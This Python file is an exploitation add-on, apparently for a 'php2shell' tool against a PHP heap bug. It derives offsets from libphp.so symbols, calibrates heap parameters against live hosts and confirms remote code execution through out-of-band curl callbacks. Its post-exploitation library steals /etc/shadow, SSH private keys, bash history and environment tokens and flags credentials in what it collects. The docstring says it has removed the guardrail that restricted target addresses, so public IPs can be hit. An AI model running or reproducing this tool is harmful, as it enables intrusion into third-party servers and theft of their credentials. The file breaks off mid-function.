#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
p2s_ext.py —— php2shell 工具扩展 v2
=================================
三个子命令，解决「换一个 PHP 版本/构建就打不动」的问题：

  symbols   从 libphp.so **符号表**确定性推导 zif_system / zval_ptr_dtor 偏移
            （不猜版本号、不看发行版；支持本机文件或 docker 容器内自动抽取），
            产出 profile JSON 骨架。
  calibrate 只标定**分配器相关**的未知量（ht_size / htdata_offset / stage2_t），
            oracle = 目标侧命令执行后 HTTP 回读标记文件（与版本无关的客观证据）。
  postex    RCE 成立后的攻击动作库（≤14B 命令），逐条回读校验 + 产物落盘 +
            凭据线索聚合。

为什么是两段式
  网络侧不可直接读远端 .so 时，版本号/发行版只能给出「大概率」；
  而 zif_system 与 zval_ptr_dtor 的偏移是**构建产物属性**，一旦拿到 .so 就是确定的。
  剩下真正需要试错的只有「167 字节槽位在目标分配器里落在哪」——这才是标定的范围。
  实测例：PHP 8.2.12(bookworm) zif=0x398EC0 dtor=0x4807D0；
          PHP 8.4.26(trixie)  zif=0x465370 dtor=0x65EB60 —— 同族不同构建，偏移不同。

命令长度硬约束
  zif_system 收到的命令上限 14 字节（ht_size 167 − 0x98 − 1）。库内命令全部 ≤14B，
  用 glob（cat /etc/p*>p）与短重定向压长度；不提供持久化/横向/清痕类动作。

护栏
  已移除地址范围校验：公网 IP 可直接作为目标，授权责任由使用者承担。
"""
import argparse
import io
import json
import os
import re
import subprocess
import sys
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
TOOL = os.path.join(HERE, "php2shell.py")
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(HERE, "..", "poc_eness"))

import php2shell_rce as R            # noqa: E402  (parse_target)
MAX_CMD = 14  # 兼容旧默认（ht_size=167）


def cmd_cap(prof):
    """按 profile 的 ht_size 计算命令容量：cap = ht_size - 0x98 - 1"""
    try:
        hs = int(prof.get("ht_size") or 167)
    except Exception:
        hs = 167
    return hs - 0x98 - 1

# 已知可用基线（bookworm / PHP 8.4.26 实测拿下；换构建后需重新 calibrate）
BASE_PROFILE = {
    "name": "bookworm-8.4.26",
    "ht_size": 167,
    "zif_offset": 0x465370,
    "dtor_offset": 0x65EB60,
    "htdata_offset": 0x690D8,
    "rounds": 8,
    "php_hint": "8.4.26",
}

def http_get(url, timeout=8.0):
    try:
        with urllib.request.urlopen(url, timeout=timeout, context=_ssl_ctx()) as r:
            return r.getcode(), r.read()
    except Exception as e:                       # noqa: BLE001
        return (getattr(e, "code", 0) or 0), b""


def hits(code, body, baseline=None, expect=None):
    """Objective oracle: 200 + 非空 + 非软404 + 可选内容特征。

    注意：只看「200 且非空」会被站点的软 404 / 兜底页骗过，真实站点上必须带
    expect（例如 id 的 uid=\\d+）或与随机不存在路径的响应做对比。
    """
    if code != 200 or not body:
        return False
    if b"Not Found" in body:
        return False
    if baseline and body.strip() == baseline.strip():
        return False
    if expect:
        pat = expect.encode() if isinstance(expect, str) else expect
        if not re.search(pat, body):
            return False
    return True


def soft404_baseline(url):
    """取一个随机不存在路径的 200 响应体，用于识别「全站 200」的软 404。"""
    probe = url.rstrip("/") + "/p2s-nx-%d" % (int(time.time() * 1000) % 10 ** 8)
    code, body = http_get(probe)
    return body if code == 200 and body else b""


# ---------------- symbols ----------------
def readelf_symbols(path):
    out = subprocess.run(["readelf", "-sW", path], capture_output=True, text=True).stdout
    syms = {}
    for ln in out.splitlines():
        f = ln.split()
        if len(f) < 8:
            continue
        try:
            val = int(f[1], 16)
        except ValueError:
            continue
        name = f[7].split("@")[0]
        if name and val:
            syms[name] = val
    return syms


def do_symbols(a):
    path = a.elf
    if a.docker:
        cname, _, rel = a.docker.partition(":")
        rel = rel or "/usr/lib/apache2/modules/libphp.so"
        dst = os.path.join(os.getcwd(), "libphp_%s.so" % cname)
        cp = subprocess.run(["docker", "cp", f"{cname}:{rel}", dst],
                            capture_output=True, text=True)
        if cp.returncode != 0:
            print(f"[symbols] docker cp 失败：{cp.stderr.strip()[:200]}")
            return 2
        path = dst
    if not path or not os.path.exists(path):
        print("[symbols] 需要 --elf <libphp.so> 或 --docker <container[:path]>")
        return 2

    syms = readelf_symbols(path)
    zif = syms.get("zif_system")
    dtor = syms.get("zval_ptr_dtor")
    if zif is None or dtor is None:
        print("[symbols] 未找到 zif_system / zval_ptr_dtor —— 二进制可能被 strip。"
              "可改用带符号的 debug 构建，或退回 calibrate 盲搜")
        return 4

    prof = dict(BASE_PROFILE)
    prof.update({"zif_offset": zif, "dtor_offset": dtor, "elf": path,
                 "name": os.path.basename(path).replace(".so", ""),
                 "calibrated": False, "source": "symbols:%s" % path})
    # 顺带读版本串，便于归档
    v = subprocess.run(["strings", "-a", path], capture_output=True, text=True).stdout
    # 版本串取"最频繁候选"，而非首个匹配：libphp 内嵌大量第三方版本串，首个匹配常是错的
    cands = re.findall(r"PHP[/ ](\d+\.\d+\.\d+)", v or "")
    if cands:
        from collections import Counter
        cnt = Counter(cands)
        prof["php_hint"] = cnt.most_common(1)[0][0]
        print(f"[symbols] 版本候选 top3：{cnt.most_common(3)}")

    print(f"[symbols] {path}")
    print(f"  zif_system    = {zif:#x}")
    print(f"  zval_ptr_dtor = {dtor:#x}")
    print(f"  php_hint      = {prof.get('php_hint', '?')}")
    if a.out:
        os.makedirs(os.path.dirname(os.path.abspath(a.out)), exist_ok=True)
        with open(a.out, "w", encoding="utf-8") as f:
            json.dump(prof, f, indent=2)
        print(f"[symbols] profile 骨架 → {a.out}（ht_size/htdata_offset 仍需 calibrate 复核）")
    return 0


# ---------------- 单次利用（复用 CLI，避免重复实现引擎） ----------------
def cli_exploit(url, cmd, prof, rounds=1, timeout=90):
    args = [sys.executable, TOOL, "exploit", "-u", url, "-c", cmd,
            "--zif-offset", hex(prof["zif_offset"]),
            "--dtor-offset", hex(prof["dtor_offset"]),
            "--htdata-offset", hex(prof["htdata_offset"]),
            "--ht-size", str(prof["ht_size"]),
            "--timeout", "120",
            "--rounds", str(rounds)]
    for k, flag in (("stage1_n", "--stage1-n"), ("stage2_t", "--stage2-t")):
        if prof.get(k):
            args += [flag, str(prof[k])]
    try:
        p = subprocess.run(args, capture_output=True, text=True,
                           timeout=max(timeout, 600))
        return p.stdout + p.stderr
    except subprocess.TimeoutExpired:
        return ""


_MIN_CMD_LEN = 6   # 实测：<6B 命令命中率显著下降（伪造 HashTable 尺寸相关）


def _pad_cmd(cmd, outfile):
    """把过短的取证命令补到 >=6B：加长落盘文件名，保持页面可回读。"""
    if not outfile or not cmd.endswith(">" + outfile):
        return cmd, outfile
    need = _MIN_CMD_LEN - len(cmd.encode())
    if need <= 0:
        return cmd, outfile
    new_out = outfile + "x" * need
    return cmd[:len(cmd) - len(outfile)] + new_out, new_out


def attempt(url, prof, cmd, outfile, rounds=1, pause=0.6, tries=1,
            expect=None, baseline=None):
    """按回读结果自动重试：单轮成功率实测约 1/6，故需要多轮 + 多次。"""
    body, log = b"", ""
    cmd, outfile = _pad_cmd(cmd, outfile)
    if baseline is None:
        baseline = soft404_baseline(url)
    for _ in range(max(1, tries)):
        log = cli_exploit(url, cmd, prof, rounds=rounds)
        time.sleep(pause)
        code, body = http_get(url.rstrip("/") + "/" + outfile)
        if hits(code, body, baseline, expect):
            return True, body, log
    return False, body, log


# ---------------- 命令库（全部 ≤14 字节） ----------------
LIB = [
    ("id",        "id>i",              "i",  "进程身份"),
    ("whoami",    "whoami>w",          "w",  "用户名"),
    ("uname",     "uname -a>u",        "u",  "内核/发行版指纹（提权前置）"),
    ("hostname",  "hostname>hn",       "hn", "主机名/容器 id"),
    ("env",       "env>e",             "e",  "环境变量：DB/云 AK/SK/代理/token"),
    ("passwd",    "cat /etc/p*>p",     "p",  "/etc/passwd"),
    ("hosts",     "cat /etc/ho*>hs",   "hs", "/etc/hosts：内网拓扑"),
    ("shadow",    "cat /etc/sh*>sh",   "sh", "/etc/shadow（需 root）"),
    ("ps",        "ps>ps",             "ps", "进程表"),
    ("ip",        "ip a>ip",           "ip", "网卡/网段"),
    ("ss",        "ss -an>ss",         "ss", "监听端口"),
    ("lsroot",    "ls -l />lr",        "lr", "根目录权限"),
    ("lsetc",     "ls /etc>le",        "le", "/etc 清单"),
    ("lsrec",     "ls -R /var>lv",     "lv", "递归 /var：应用配置"),
    ("bashhist",  "cat ~/.b*>hb",      "hb", "bash 历史（常见明文口令）"),
    ("sshkey",    "cat ~/.ssh/*>sk",   "sk", "SSH 私钥"),
    ("crontab",   "crontab -l>ct",     "ct", "计划任务"),
    ("dockersock","ls /var/run>vr",    "vr", "是否挂 docker.sock"),
    ("logs",      "cat /var/*/*>lg",   "lg", "日志片段（可见性判断）"),
]




import json
import threading
import http.server


from urllib.parse import urlsplit

def _insecure():
    """--insecure / PHP2SHELL_INSECURE=1：https 目标跳过证书校验。"""
    return os.environ.get("PHP2SHELL_INSECURE", "") == "1"


def _ssl_ctx():
    """返回可直接传给 urlopen(context=...) 的 SSLContext；未开启 insecure 时返回 None。"""
    if not _insecure():
        return None
    import ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def requests_get(url, timeout=10, **kw):
    import requests as _rq
    if _insecure():
        kw.setdefault("verify", False)
        try:  # 跳过校验时屏蔽 InsecureRequestWarning 噪音
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except Exception:
            pass
    return _rq.get(url, timeout=timeout, **kw)


HITS = []           # 带外回调命中记录



def load_profile(a):
    """从 BASE_PROFILE 出发，用 --profile / CLI 覆盖构建 profile。"""
    prof = dict(BASE_PROFILE)
    path = getattr(a, "profile", None)
    if path:
        try:
            prof.update(json.load(open(path, encoding="utf-8")))
            print(f"[*] 载入 profile：{path}")
        except Exception as e:
            print(f"[!] profile 读取失败：{e}")
    for key, attr in (("ht_size", "ht_size"), ("zif_offset", "zif_offset"),
                      ("dtor_offset", "dtor_offset"), ("htdata_offset", "htdata_offset"),
                      ("stage1_n", "stage1_n"), ("stage2_t", "stage2_t")):
        v = getattr(a, attr, None)
        if v is not None:
            prof[key] = v
    return prof


class _CB(http.server.BaseHTTPRequestHandler):
    def _h(self):
        HITS.append({"t": time.time(), "path": self.path,
                     "ua": self.headers.get("User-Agent", ""),
                     "ip": self.client_address[0]})
        body = b"ok"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    do_GET = _h
    do_POST = _h

    def log_message(self, *a):
        pass


def start_listener(port):
    http.server.ThreadingHTTPServer.allow_reuse_address = True
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), _CB)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    # 自检：确认本进程确实收得到连接（否则后续 miss 全为假阴性）
    try:
        import urllib.request
        urllib.request.urlopen(f"http://127.0.0.1:{port}/__selfcheck", timeout=3).read()
        ok = any(h["path"] == "/__selfcheck" for h in HITS)
        print("[*] 监听自检：" + ("通过" if ok else "失败（端口被其他进程占用）"))
        if not ok:
            raise OSError("listener self-check failed")
    except Exception as e:
        raise OSError(f"self-check: {e}")
    return srv


# ---------------- 只读指纹（不触发 OOM） ----------------
def do_fingerprint(a):
    base = a.url.rstrip("/")
    ver = None
    seen = {}
    paths = ["/", "/index.php", "/phpinfo.php", "/info.php", "/test.php"]
    for p in paths[: max(1, a.max_paths)]:
        try:
            code, body = http_get(base + p, timeout=a.timeout)
        except Exception:
            continue
        seen[p] = code
        m = re.search(rb"PHP/(\d+\.\d+\.\d+)", body) or re.search(rb"PHP Version (\d+\.\d+\.\d+)", body)
        if m:
            ver = m.group(1).decode()
            print(f"[+] {p} 泄露版本：PHP/{ver}")
            break
        if code == 200 and p != "/":
            print(f"[*] {p} = 200（{len(body)}B）")
    print("[*] 路径探测结果：" + ", ".join(f"{k}={v}" for k, v in seen.items()))
    # 全部探测路径均无响应（连接被拒 / TLS 校验失败 / 超时）⇒ 不可达，绝不能再报 LIKELY_RCE
    if not seen or all((c or 0) <= 0 for c in seen.values()):
        print("[-] 不可达：全部路径探测均无响应（连接失败/超时/TLS 校验失败）。")
        if not _insecure():
            print("    https 目标若为自签或过期证书，请加 --insecure 重试（默认严格校验证书）。")
        return 50
    # ---- 条件3：session 消费点只读探测（不触发 OOM） ----
    sink_names = []
    for p in paths[: max(1, a.max_paths)]:
        try:
            rr = requests_get(base + p, timeout=a.timeout)
        except Exception:
            continue
        raw_ck = rr.headers.get("Set-Cookie") or ""
        for kv in raw_ck.split(","):
            nm = kv.strip().split("=")[0].strip()
            if nm and nm not in sink_names:
                sink_names.append(nm)
    if sink_names:
        print("[+] 条件3 session 消费点：疑似存在（Set-Cookie: " + ", ".join(sink_names[:4]) + "）")
    else:
        print("[-] 条件3 session 消费点：未检出（探测路径零 Set-Cookie -> 无脚本 session_start()；"
              "109618 无悬垂落点）")
    # 头部指纹
    try:
        r = requests_get(base + "/", timeout=a.timeout)
        print(f"[*] Server: {r.headers.get('Server','-')} | X-Powered-By: {r.headers.get('X-Powered-By','-')}")
        m = re.search(r"PHP/(\d+\.\d+\.\d+)", r.headers.get("X-Powered-By", ""))
        if m and not ver:
            ver = m.group(1)
    except Exception as e:
        print(f"[!] 头部获取失败：{e}")
    if not ver:
        print("[!] 未取得版本：目标关闭了版本暴露。用组件情报/响应差异判定，禁止直接打 OOM（会造成 DoS）")
        return 10
    print(f"[+] 判定版本：PHP {ver}")
    parts = [int(x) for x in ver.split(".")][:3]
    vuln = {"8.2": (8, 2, 35), "8.3": (8, 3, 36), "8.4": (8, 4, 27), "8.5": (8, 5, 12)}
    key = f"{parts[0]}.{parts[1]}"
    if key in vuln:
        lim = vuln[key]
        if tuple(parts) < lim:
            print(f"[+] AFFECTED：{ver} < {'.'.join(map(str,lim))}（109618 影响区间）")
            print("    但能否 RCE 取决于配置：post_max_size > memory_limit 且存在 session_start 消费点")
            if not sink_names:
                print("    [!] 未检出 Set-Cookie：若其他入口也无 session_start()，则 109618 无悬垂落点")
            return 0
        print(f"[-] PATCHED：{ver} >= {'.'.join(map(str,lim))}")
        return 30
    print(f"[?] {ver} 不在已知矩阵内：按符号推导+标定流程自行判定")
    return 10


# ---------------- 盲验证：带外回调，不依赖回读通道 ----------------
def do_blind(a):
    prof = load_profile(a)
    cap = cmd_cap(prof)
    collab = a.collab
    cands = []
    for tmpl in (f"curl {collab}/{a.token}", f"curl {collab}", f"getent hosts {collab}"):
        if len(tmpl) <= cap:
            cands.append(tmpl)
    if not cands:
        print(f"[!] 回调命令全部超过容量 cap={cap}B（collab 需用短域名/短 IP）")
        print(f"    例：cap=14 时可用 `curl h:9000/p1`（14B）；长域名请先提升 ht_size 或在目标上另找通道")
        return 2
    payload = cands[0]
    print(f"[*] 回调命令：{payload!r}（{len(payload)}B / cap {cap}B）")
    print(f"[*] 目标：{a.url}  ht_size={prof['ht_size']} htdata={hex(prof['htdata_offset'])}")

    srv = None
    if a.listen:
        try:
            srv = start_listener(getattr(a, "listen_port", 9000))
            print(f"[*] 本机回调监听：0.0.0.0:{a.listen_port}（等待目标出站连接）")
        except OSError as e:
            print(f"[!] 监听 {a.listen_port} 失败（{e}）；继续发送但无法本地取证，请改用外部协作端")
            a.listen = False

    base = len(HITS)
    t0 = time.time()
    # 一轮进程内多轮重试命中率远高于"每轮都新建连接"，务必一次性交给 exploit
    cli_exploit(a.url, payload, prof, rounds=max(1, a.rounds), timeout=a.timeout)
    deadline = time.time() + a.wait
    while time.time() < deadline and len(HITS) == base:
        time.sleep(1)
    new = HITS[base:]
    if srv:
        srv.shutdown()
    if new:
        for h in new:
            print(f"[+] 回调命中：{time.strftime('%H:%M:%S', time.localtime(h['t']))} "
                  f"来自 {h['ip']} path={h['path']} ua={h['ua'][:48]!r}")
        print("[+] 结论：命令执行成立（目标主动向协作端发起连接，无需任何回读通道）")
        return 0
    print(f"[-] {int(time.time()-t0)}s 内未收到回调。可能：命令未执行 / 目标无 egress / "
          f"curl 不存在 / 容量不足 / 前置条件不满足")
    print("    下一步：改用时间侧信道（对比响应耗时）或申请在目标侧查看日志；不要靠盲目加轮次制造 DoS")
    return 10

# ---------------- calibrate ----------------
def sweep(lo, hi, step):
    v = lo
    while v <= hi:
        yield v
        v += step


def do_calibrate(a):
    if getattr(a, "collab", None):
        return _calibrate_collab(a)
    host, port, path = R.parse_target(a.url)

    prof = dict(BASE_PROFILE)
    if a.profile:
        with open(a.profile, encoding="utf-8") as f:
            prof.update(json.load(f))
    for k in ("ht_size", "zif_offset", "dtor_offset", "htdata_offset",
              "stage1_n", "stage2_t"):
        v = getattr(a, k, None)
        if v is not None:
            prof[k] = v

    hts = ([a.ht_size] if a.ht_size else
           list(sweep(a.ht_size_lo, a.ht_size_hi, a.ht_size_step)))
    if a.htdata_window:
        lo, hi = [int(x, 0) for x in a.htdata_window.split(":")]
        hds = list(sweep(lo, hi, a.htdata_step))
    else:
        hds = [prof["htdata_offset"]]

    total = len(hts) * len(hds)
    print(f"[calibrate] {a.url} zif={prof['zif_offset']:#x} dtor={prof['dtor_offset']:#x} "
          f"ht_size={hts} htdata={len(hds)} 个 合计 {total} 组 rounds={a.rounds}")
    n = 0
    t0 = time.time()
    for hs in hts:
        for hd in hds:
            n += 1
            cand = dict(prof, ht_size=hs, htdata_offset=hd)
            tag = f"k{n}"
            print(f"  [{n}/{total}] hs={hs} htdata={hd:#x} ... ", end="", flush=True)
            if getattr(a, "dir", None):
                # 绝对目录通道：不受 cwd 影响，oracle 直接看本机映射目录
                real = f"id>{a.dir.rstrip('/')}/{tag}"
                if len(real) > cmd_cap(cand):
                    print(f"SKIP(>{cmd_cap(cand)}B)")
                    continue
                ok, body, log = False, b"", ""
                try:
                    os.remove(os.path.join(a.local_dir or "", tag))
                except OSError:
                    pass
                for _ in range(max(1, a.tries)):
                    log = cli_exploit(a.url, real, cand, rounds=a.rounds)
                    time.sleep(a.pause)
                    fp = os.path.join(a.local_dir or "", tag)
                    if os.path.exists(fp):
                        body = open(fp, "rb").read()
                        if body:
                            ok = True
                            break
            else:
                ok, body, log = attempt(a.url, cand, f"id>{tag}", tag, rounds=a.rounds,
                                        tries=a.tries, expect=rb"uid=\d+")
            if ok:
                cand.update({"name": f"cal-{host.replace('.', '-')}-{hs}",
                             "calibrated": True,
                             "source": "calibrate:%s" % a.url,
                             "php_hint": body.decode("utf-8", "replace").strip()[:80]})
                out = a.out or os.path.join(os.path.dirname(HERE), "profiles",
                                            f"{host.replace('.', '_')}_{port}_{hs}.json")
                os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
                with open(out, "w", encoding="utf-8") as f:
                    json.dump(cand, f, indent=2)
                print(f"HIT → {out}")
                print(f"[calibrate] 命中 ht_size={hs} htdata={hd:#x}；回读={cand['php_hint']}；"
                      f"耗时 {time.time() - t0:.1f}s")
                return 0
            st3 = "stage3" if "Stage-3" in log else ("stage2" if "Stage-2" in log else "stage1")
            print(f"miss({st3})")
    print(f"[calibrate] {total} 组全败（{time.time() - t0:.1f}s）；"
          f"扩大 --htdata-window / --ht-size-* 或先用 symbols 校正 zif/dtor")
    return 15



def _calibrate_collab(a):
    """用带外回调做 oracle：候选成功 = 监听器收到该候选 tag 的请求。
    适用于真实目标（无可写目录/无回读通道），代价是每个候选都要发一轮 OOM 链。"""
    cap = cmd_cap({"ht_size": a.ht_size})
    try:
        srv = start_listener(getattr(a, "listen_port", 9000))
    except OSError as e:
        print(f"[!] 监听失败：{e}")
        return 2
    print(f"[*] 回调 oracle 监听 0.0.0.0:{getattr(a, 'listen_port', 9000)}；cap={cap}B")
    prof = dict(BASE_PROFILE)
    prof.update({"ht_size": a.ht_size,
                 "zif_offset": a.zif_offset or BASE_PROFILE["zif_offset"],
                 "dtor_offset": a.dtor_offset or BASE_PROFILE["dtor_offset"]})
    if getattr(a, "stage1_n", None):
        prof["stage1_n"] = a.stage1_n
    if a.stage2_t:
        prof["stage2_t"] = a.stage2_t
    win = a.htdata_window or "0x68000:0x6A000"
    start, end = [int(x, 0) for x in str(win).split(":")]
    step = int(a.htdata_step or 0x100, 0) if isinstance(a.htdata_step, str) else (a.htdata_step or 0x100)
    off = start
    idx = 0
    hits = []
    while off <= end:
        tag = f"c{idx%10}{idx//10}"[:2] if cap >= 9 else f"{idx}"[-1]
        cmd = f"curl {a.collab}/{tag}"
        if len(cmd) > cap:
            print(f"[!] 回调命令 {cmd!r} 超容量 {cap}B：请用更短的 collab/tag")
            srv.shutdown()
            return 2
        prof["htdata_offset"] = off
        base = len(HITS)
        print(f"[*] 候选 htdata={hex(off)} tag={tag} cmd={cmd!r}", end=" ", flush=True)
        cli_exploit(a.url, cmd, prof, rounds=max(1, a.rounds),
                    timeout=getattr(a, "timeout", 120))
        dl = time.time() + 6
        while time.time() < dl and len(HITS) == base:
            time.sleep(1)
        got = [h for h in HITS[base:] if tag in h["path"]]
        if got:
            print("HIT")
            print(f"[+] 标定成功：ht_size={a.ht_size} htdata_offset={hex(off)} "
                  f"（回调 {got[0]['path']} 来自 {got[0]['ip']}）")
            hits.append(off)
            pdir = "profiles"
            try:
                os.makedirs(pdir, exist_ok=True)
                host = urlsplit(a.url).hostname
                port = urlsplit(a.url).port or 80
                out = a.out or os.path.join(pdir, f"{host}_{port}_{a.ht_size}.json")
                json.dump({"ht_size": a.ht_size, "htdata_offset": off,
                           "zif_offset": prof["zif_offset"], "dtor_offset": prof["dtor_offset"],
                           "stage1_n": prof.get("stage1_n"),
                           "stage2_t": prof.get("stage2_t"), "url": a.url,
                           "calibrated": True, "oracle": "oob-callback"},
                          open(out, "w"), indent=2)
                print(f"[*] profile 已写入 {out}")
            except Exception as e:
                print(f"[!] profile 写入失败：{e}")
            break
        print("miss")
        idx += 1
        off += step
    srv.shutdown()
    return 0 if hits else 20

# ---------------- postex ----------------
CRED_PAT = re.compile(
    rb"(?i)(passw|secret|token|api[_-]?key|access[_-]?key|aws_|AKIA|database_url|"
    rb"mysql|redis|smtp|private[_-]?key|BEGIN [A-Z ]*PRIVATE KEY)")


def do_postex(a):
    host, port, path = R.parse_target(a.url)

    prof = dict(BASE_PROFILE)
    if a.profile:
        with open(a.profile, encoding="utf-8") as f:
            prof.update(json.load(f))
    for k in ("ht_size", "zif_offset", "dtor_offset", "htdata_offset",
              "stage1_n", "stage2_t"):
        v = getattr(a, k, None)
        if v is not None:
            prof[k] = v

    channel_dir = (a.dir or "").rstrip("/")
    local_dir = a.local_dir
    if channel_dir and not local_dir:
        print("[postex] --dir 需要同时给 --local-dir（用于回读落在宿主/本机的同一目录）")
        return 2

    only = set(x.strip() for x in a.only.split(",")) if a.only else None
    items = [it for it in LIB if (only is None or it[0] in only)]
    outdir = a.outdir or os.path.join(os.getcwd(), "postex_out")
    os.makedirs(outdir, exist_ok=True)

    print(f"[postex] {a.url} profile={prof.get('name')} ht_size={prof['ht_size']} "
          f"htdata={prof['htdata_offset']:#x} 命令 {len(items)} 条 → {outdir}")
    rows, creds = [], []
    for key, cmd, outf, desc in items:
        cap = cmd_cap(prof)
        if channel_dir:
            # 绝对目录通道：命令写 <dir>/<outf>，回读直接读本机 <local_dir>/<outf>
            real_cmd = cmd.replace(">" + outf, ">" + channel_dir + "/" + outf, 1)
            if len(real_cmd) > cap:
                print(f"  {key:<10} {real_cmd:<18} ... SKIP(>{cap}B)")
                rows.append({"key": key, "cmd": real_cmd, "desc": desc,
                             "status": "SKIP_TOO_LONG", "bytes": 0, "file": None})
                continue
        else:
            real_cmd = cmd
        print(f"  {key:<10} {real_cmd:<18} ... ", end="", flush=True)
        if channel_dir:
            ok, body = False, b""
            fp = os.path.join(local_dir, outf)
            try:
                os.remove(fp)          # 先清残留，避免旧文件造成假命中
            except OSError:
                pass
            for _ in range(max(1, a.tries)):
                cli_exploit(a.url, real_cmd, prof, rounds=a.rounds)
                time.sleep(a.pause)
                if os.path.exists(fp):
                    body = open(fp, "rb").read()
                    ok = True
                    break
        else:
            ok, body, _ = attempt(a.url, prof, real_cmd, outf, rounds=a.rounds,
                                  pause=a.pause, tries=a.tries)
        if ok:
            with open(os.path.join(outdir, key), "wb") as f:
                f.write(body)
            tag = f"OK {len(body)}B"
            if CRED_PAT.search(body):
                tag += " ⚠凭据线索"
                creds.append(key)
            print(tag)
            rows.append({"key": key, "cmd": cmd, "desc": desc, "status": "OK",
                         "bytes": len(body), "file": os.path.join(outdir, key)})
        else:
            print("no-effect")
            rows.append({"key": key, "cmd": cmd, "desc": desc,
                         "status": "NO_EFFECT", "bytes": 0, "file": None})

    rp = os.path.join(outdir, "report.json")
    with open(rp, "w", encoding="utf-8") as f:
        json.dump({"target": a.url, "profile": prof, "results": rows,
                   "credential_like": creds,
                   "ts": time.strftime("%Y-%m-%dT%H:%M:%S")}, f, indent=2, ensure_ascii=False)
    good = [r for r in rows if r["status"] == "OK"]
    print(f"\n[postex] 成功 {len(good)}/{len(rows)}；报告 {rp}")
    if creds:
        print(f"[postex] 凭据类线索出现在: {', '.join(creds)}")
    if a.cleanup:
        names = [it[2] for it in items]
        for i in range(0, len(names), 3):
            cli_exploit(a.url, "rm " + " ".join(names[i:i + 3]), prof, rounds=1)
            time.sleep(a.pause)
        print("[postex] 已投递清理（rm 分批，≤14B）")
    return 0 if good else 20


# ---------------------------------------------------------------- oneclick
# 已知构建 profile 库：键为 PHP 版本串。命中即免手工传参。
PROFILE_DB = {
    "8.4.26": dict(ht_size=167, htdata_offset=0x690D8, zif_offset=0x465370,
                   dtor_offset=0x65EB60, stage2_t=406, rce_ok=True,
                   label="php:8.4.26-apache (Debian trixie) 实测 RCE 可用，cap=14B"),
    "8.2.12": dict(ht_size=167, htdata_offset=0x690D8, zif_offset=0x398EC0,
                   dtor_offset=0x4807D0, stage2_t=406, rce_ok=False,
                   label="PHP 8.2.12(NTS) 实测 Stage-1 泄漏必失败 → 仅 DoS 可证"),
}


# ---------------- 外部 profile 库（profiles.json） ----------------
# 搜索顺序：包内 profiles.json -> ~/.php2shell/profiles.json -> ./profiles.json
# 格式示例：
# {"8.2.34": {"ht_size":167, "htdata_offset":"0x690D8", "zif_offset":"0x398EC0",
#             "dtor_offset":"0x4807D0", "stage2_t":406, "rce_ok":false, "label":"..."}}
_PROFILE_STORES = [
    os.path.join(HERE, "profiles.json"),
    os.path.expanduser("~/.php2shell/profiles.json"),
    "profiles.json",
]


def _coerce_profile(prof):
    """把 JSON 里的字符串十六进制转成 int，保持与内置 profile 同构。"""
    out = dict(prof)
    for k in ("htdata_offset", "zif_offset", "dtor_offset"):
        v = out.get(k)
        if isinstance(v, str):
            try:
                out[k] = int(v, 0)
            except Exception:
                pass
    if "ht_size" in out:
        try:
            out["ht_size"] = int(out["ht_size"])
        except Exception:
            pass
    if "stage2_t" in out:
        try:
            out["stage2_t"] = int(out["stage2_t"])
        except Exception:
            pass
    out.setdefault("rce_ok", True)
    return out


def import_profile_store(verbose=False):
    """把外部 profiles.json 合入 PROFILE_DB；同名版本以内置为准（不覆盖）。"""
    added = 0
    for path in _PROFILE_STORES:
        try:
            if not os.path.isfile(path):
                continue
            with open(path, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            if not isinstance(data, dict):
                if verbose:
                    print(f"[!] profiles.json 顶层不是对象：{path}")
                continue
            for ver, prof in data.items():
                ver = str(ver).strip()
                if not isinstance(prof, dict):
                    continue
                if ver in PROFILE_DB:
                    if verbose:
                        print(f"[*] profiles.json: {ver} 已内置，跳过（{path}）")
                    continue
                p = _coerce_profile(prof)
                p.setdefault("label", "profiles.json:%s" % ver)
                PROFILE_DB[ver] = p
                added += 1
                if verbose:
                    print(f"[+] profiles.json: 载入 profile {ver}（{path}）")
        except Exception as e:
            if verbose:
                print(f"[!] profiles.json 读取失败 {path}: {e}")
            continue
    if verbose and added:
        print(f"[*] profiles.json 共新增 {added} 个 profile")
    return added


def _ver_key(v):
    m = re.match(r"(\d+\.\d+\.\d+)", (v or "").strip())
    return m.group(1) if m else None


FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}


def _is_patched(ver):
    """按官方修复版本矩阵判断是否已修复。"""
    k = _ver_key(ver)
    if not k:
        return False
    mm, pp = k.split(".")[0] + "." + k.split(".")[1], int(k.split(".")[2])
    fx = FIXED.get(mm)
    return bool(fx is not None and pp >= fx)


def _http_get(url, timeout=20, headers=None):
    """极简 GET（真实目标回读用，无第三方依赖）。失败返 None。"""
    try:
        import urllib.request
        req = urllib.request.Request(url, headers=headers or {
            "User-Agent": "Mozilla/5.0 (compatible; php2shell-verify)",
            "Cache-Control": "no-cache",
        })
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.read().decode("utf-8", "replace")
    except Exception:
        return None


def _run(cmd, timeout=1800):
    """跑子进程，返回 (rc, out+err)。"""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return 124, "[timeout] %s" % " ".join(cmd)
    except Exception as e:
        return 125, "[err] %s" % e


def _load_json(p):
    try:
        with io.open(p, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def _pick_profile(scan, a):
    """profile 选择优先级：--profile > PROFILE_DB(按版本) > CLI 显式覆盖。"""
    prof = dict(BASE_PROFILE)
    src = "base"
    if getattr(a, "profile", None):
        p2 = _load_json(a.profile) or {}
        if p2:
            prof.update({k: v for k, v in p2.items() if v is not None})
        src = "file:%s" % a.profile
        if p2.get("calibrated") is False:
            prof["_needs_cal"] = True
    else:
        k = _ver_key((scan or {}).get("php_version"))
        pid = PROFILE_DB.get(k) if k else None
        if pid:
            prof.update({kk: vv for kk, vv in pid.items() if kk not in ("rce_ok", "label")})
            src = "db:%s" % k
